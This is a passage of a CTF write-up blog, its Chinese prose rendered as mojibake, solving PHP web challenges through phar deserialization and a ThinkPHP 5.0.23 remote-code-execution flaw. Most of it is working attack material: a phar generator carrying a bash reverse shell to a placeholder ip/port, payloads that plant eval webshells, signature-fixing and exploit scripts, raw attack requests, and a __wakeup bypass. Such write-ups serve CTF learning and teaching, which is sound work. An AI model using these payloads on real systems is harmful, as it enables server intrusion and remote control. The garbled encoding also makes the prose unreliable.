<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œæˆ‘ä»¬è€ƒè™‘<code>pharååºåˆ—åŒ–</code><br>è¿™ä¸ªæ—¶å€™å¤ç°å‘¢ï¼Œè·Ÿæˆ‘4æœˆä»½æ‰“<code>XYCTF</code>çš„<code>pharme</code>ç±»ä¼¼ï¼Œä¸è¿‡å®ƒçš„æ˜¯<code>æ— å‚RCE</code>ï¼Œè¿™é¢˜çš„<code>class.php</code>ç”šè‡³æ²¡æœ‰è®¾ç½®é™åˆ¶ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾(execå‡½æ•°çš„ç‰¹æ€§)ï¼Œä¸€èˆ¬å°±å†™ä¸€å¥è¯æœ¨é©¬è·Ÿåå¼¹shelläº†ï¼Œæˆ–è€…é‡å®šå‘å†™å…¥æ–‡ä»¶</p>
<p>å°è¯•<code>åå¼¹shell</code>ï¼Œä¸ªäººæ„Ÿè§‰ä¼šæ¯”è¾ƒæ–¹ä¾¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸ªå°é—®é¢˜ï¼Œå¥½åƒ<code>åå¼¹shell</code>çš„è¯ï¼Œç”¨<code>bash -i</code>ï¼Œåˆ·æ–°æ²¡ååº”ï¼Ÿç„¶åçœ‹è§æœ‰äººåŠ äº†<code>bash -c</code>ï¼Œå°±å¯ä»¥äº†ï¼Œ<code>é€šå¸¸ä½¿ç”¨shellå»è¿è¡Œè„šæœ¬ï¼Œä¸¤ç§æ–¹æ³• bash xxx.shï¼Œå¦å¤–ä¸€ç§å°±æ˜¯bash -c â€œcmd stringâ€</code>ï¼Œè¿™æ ·çš„å—ï¼Œåˆå­¦åˆ°äº†</p>
<p>æ–‡ä»¶ç­¾åä¿®æ”¹ï¼Œåç¼€ç»•è¿‡ï¼Œä¸Šä¼ <code>phar.jpg</code>ï¼Œ<code>pharä¼ªåè®®</code>è¯»å–</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†</span></span><br><span class="line">new_file = s + sha1(s).digest() + h  <span class="comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class="line">f_gzip = gzip.GzipFile(<span class="string">&quot;phar.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f_gzip.write(new_file)</span><br><span class="line">f_gzip.close()</span><br></pre></td></tr></table></figure>
<p><code>url/class.php</code><br><code>POST: file=phar://upload/628941e623f5a967093007bf39be805f.jpg</code></p>
<p>å†™ä¸€å¥è¯æœ¨é©¬çš„ï¼Œç›´æ¥å‚è€ƒå®˜æ–¹å§<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¢˜ç›®å¯¹__HALT_COMPILER()è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨gzipç­‰å‹ç¼©è¿›è¡Œç»•è¿‡ï¼ŒPharååºåˆ—åŒ–çš„ä¸€ä¸ªå°æŠ€å·§</span><br><span class="line">å…¶æ¬¡è€ƒç‚¹åœ¨äºæ¶æ„ç±»ä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— å›æ˜¾çš„</span><br><span class="line">ä¸è¿‡Webæ ¹ç›®å½•å¯å†™ï¼Œå¯ä»¥ç›´æ¥å†™ä¸€ä¸ªWebShellè¿›å»ï¼Œå…¶ä»–æ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">       <span class="comment">// ç½‘ç«™æ ¹ç›®å½•ä¸‹</span></span><br><span class="line">   &#125;</span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="string">&quot;gzip 1.phar&quot;</span>);</span><br><span class="line">   <span class="title function_ invoke__">rename</span>(<span class="string">&quot;1.phar.gz&quot;</span>, <span class="string">&quot;1.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>ä¸Šä¼ 1.jpgæ–‡ä»¶ååœ¨class.php unlinkå‡½æ•°å¤„ä½¿ç”¨pharåè®®è§¦å‘å³å¯å†™å…¥1.php Shell</code></p>
<p>å…ˆ<code>/class.php</code>ï¼Œ<code>pharä¼ªåè®®</code>è¯»å–æ–‡ä»¶ï¼Œå†<code>/1.php</code>ï¼Œå‘½ä»¤æ‰§è¡Œ</p>
<h3 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy ()"></a>OtenkiBoy ()</h3><p>å¾…è¡¥ingâ€¦â€¦</p>
<h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h3><p>cookie: <code>pairing.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><code>file_exists($Adam);</code>å¯ä»¥è§¦å‘<code>pharååºåˆ—åŒ–</code>ï¼Œ<code>post</code>çš„å†…å®¹ç»è¿‡urlç¼–ç ä¹‹åå¯å†™å…¥åˆ°<code>pear</code>ä¼ å…¥çš„<code>pharæ–‡ä»¶</code>ä¸­ï¼Œ<code>apple</code>å¤„æ‰§è¡Œ<code>pharä¼ªåè®®</code></p>
<p>å¦‚æœæ‰“<code>pharååºåˆ—åŒ–</code>ï¼Œååºåˆ—åŒ–ä¼šè°ƒç”¨<code>__wakeup()</code>ï¼Œéœ€è¦ç»•è¿‡</p>
<p>ä½†å¥½åƒå¯ä»¥ç›´æ¥æ‰“è¿™ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†™å…¥ä¸€å¥è¯æœ¨é©¬ç»™<code>$pear</code>ï¼Œä½†æ˜¯æˆ‘ä»¬è¦å†™å…¥<code>$pear</code>è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å½“å‰é¡µé¢æ‰€åœ¨ä½ç½®ï¼Œå¼€å¯<code>Apache</code>æœåŠ¡å™¨ï¼Œ<code>/var/www/html/</code>(ç½‘ç«™æ ¹ç›®å½•)ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯<code>Apache</code>é»˜è®¤çš„å­˜æ”¾é¦–é¡µçš„ç›®å½•(é»˜è®¤æ˜¯index.html)ï¼Œè®¿é—®<code>/var/www/html/pairing.php</code>ï¼Œå³<code>url/pairing.php</code>ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¸€ç§åšé¢˜ç»éªŒï¼Œflagä½ç½®æœ‰æ—¶å€™å°±ä¼šåœ¨<code>var/www/html/flag</code></p>
<p>å°†payloadï¼š<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>ï¼Œ<code>urlencode</code>åä¼ å…¥</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /pairing.php?pear=/var/wwww/html/1.php&amp;apple=1 HTTP/1.1</span><br><span class="line">Host: 8060f47a-668b-4c9d-9025-2a2d5dbb71c7.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: looklook=pairing.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">%3C?php%20eval($_POST%5B&#x27;cmd&#x27;%5D);?%3E</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET url/1.php</span><br><span class="line">POST cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šæ˜¯éé¢„æœŸ</p>
<p>ä¸‹é¢æ‰“<code>pharååºåˆ—åŒ–</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨æ„ï¼šphpä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡å’Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªå¯¹è±¡æ˜¯æœ‰æ‰€ä¸åŒçš„</span><br><span class="line">ä¾‹å¦‚åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¸€èˆ¬ä¼šä¼˜å…ˆè°ƒç”¨__construct()æ–¹æ³•</span><br><span class="line">è€Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªå¯¹è±¡è‹¥å­˜åœ¨__wakeup()æ–¹æ³•åˆ™ä¼šä¼˜å…ˆè°ƒç”¨å®ƒè€Œä¸å»æ‰§è¡Œ__construct()</span><br></pre></td></tr></table></figure>
<p><code>__wakeup()</code>ç»•è¿‡ï¼Œ<code>cve-2016-7124</code>ï¼Œå½±å“èŒƒå›´<code>PHP5 &lt; 5.6.25</code>å’Œ<code>PHP7 &lt; 7.0.10</code><br>æ»¡è¶³PHPç‰ˆæœ¬è¦æ±‚(é¢˜ç›®ç¯å¢ƒ7.0.9)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span> = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;user = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>å°†å±æ€§ä¸ªæ•°(+1)ï¼Œå¾€å¤§æ”¹å³å¯ï¼Œç»•è¿‡<code>__wakeup()</code></p>
<p>æ–‡ä»¶ç­¾åä¿®æ”¹ï¼Œå› ä¸ºä¸Šé¢æˆ‘ä»¬åšäº†ä¿®æ”¹ï¼Œå¯¼è‡´äº†è¯¥æ–‡ä»¶çš„ç­¾åä¸ä¿®æ”¹åçš„æ–‡ä»¶ä¸åŒ¹é…ï¼Œéœ€è¦æ›´æ¢æ–°çš„ç­¾å</p>
<p>è²Œä¼¼åˆæœ‰è¯´çœ‹å€’æ•°ç¬¬å…«ä¸ªå­—èŠ‚ï¼Œå¦‚æœ<code>02</code>ç”¨<code>sha1</code>ï¼Œè¿™ä¸ªç¡®å®ï¼Œå¥½åƒæ˜¯å¦‚æœ<code>03</code>ï¼Œåˆ™ç”¨<code>sha256</code>ï¼Œä¸æ¸…æ¥š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phar.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®ï¼Œsha256ä¸º[:-40]</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†</span></span><br><span class="line">new_file = s + sha1(s).digest() + h  <span class="comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\1.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(new_file)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://68765a91-67ec-4908-8c08-21950c5c65c5.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">pattern = <span class="string">r&#x27;flag\&#123;.+?\&#125;&#x27;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;pear&#x27;</span>: <span class="string">&#x27;1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;phar://1.phar&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\1.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    f = fi.read()</span><br><span class="line">    ff = urllib.parse.quote(f)</span><br><span class="line">    fin = requests.post(url=url+<span class="string">&quot;pairing.php&quot;</span>, data=ff, params=params)</span><br><span class="line">    matches = re.findall(pattern, fin.text)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(<span class="keyword">match</span>)</span><br></pre></td></tr></table></figure>
<p>emmmï¼Œæ²¡æ‰“å‡ºæ¥ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œå¥½å¥‡æ€ªå•Šï¼Œéš¾ä¸æˆæ˜¯ç¯å¢ƒé—®é¢˜ï¼Ÿ<br>è¿™é¢˜å°±è¿™æ ·å§ï¼Œå¡å¤§åŠå¤©äº†</p>
<p><a target="_blank" rel="noopener" href="https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF.html">https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF.html</a></p>
<h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>å¥½ç†Ÿæ‚‰çš„<code>ThinkPHP</code>ï¼ŒV5ç‰ˆæœ¬</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105907276">https://blog.csdn.net/qq_45521281/article/details/105907276</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Lucky1youzi/article/details/128740552">https://blog.csdn.net/Lucky1youzi/article/details/128740552</a><br>æŠ¥é”™æŸ¥çœ‹ç‰ˆæœ¬<br><code>url/index.php?s=captcha</code><br>å¾—åˆ°ï¼Œ<code>ThinkPHP V5.0.23 &#123; åå¹´ç£¨ä¸€å‰‘-ä¸ºAPIå¼€å‘è®¾è®¡çš„é«˜æ€§èƒ½æ¡†æ¶ &#125;</code></p>
<p>ç»§ç»­postï¼Œ<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /</code><br>å…¶ä¸­filter[]çš„å€¼æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œserver[REQUEST_METHOD]çš„å€¼æ˜¯å‘½ä»¤çš„å‚æ•°ï¼ˆå› ä¸ºæºç å®é™…ä½¿ç”¨çš„æ˜¯call_user_funcæ¥æ‰§è¡Œå‘½ä»¤çš„ï¼‰</p>
<p>å‘ç°ä¸è¡Œï¼Œå¯èƒ½æ˜¯<code>systemå‡½æ•°</code>è¢«ç¦äº†ï¼ŸæŸ¥çœ‹<code>phpinfo</code><br><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</code>ï¼Œå‘ç°ç¡®å®å¦‚æ­¤</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">get: url/index.php?s=captcha&amp;test=-1</span><br><span class="line">post: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°æ ¹ç›®å½•<code>DOCUMENT_ROOT</code>ï¼Œ<code>/var/www/public</code></p>
<p><code>exec</code>å†™å…¥webshell</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">getï¼šurl/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">postï¼š_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;<span class="meta">&lt;?php%20eval($_POST[&#x27;cmd&#x27;]);?&gt;</span>&#x27;%20&gt;%20/var/www/public/shell.php</span><br></pre></td></tr></table></figure>
<p>è¿”å›çŠ¶æ€ç 500äº†ï¼Œbpå‘åŒ…è¯•è¯•ï¼Œå‘ç°å¯ä»¥äº†ï¼Œèšå‰‘è¿æ¥ï¼Œ<code>url/shell.php</code><br>å‘ç°åˆè¦ææƒäº†(æˆ‘æ˜¯å…ˆæ‰“çš„åé¢çš„4-å¤ç›˜ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹)</p>
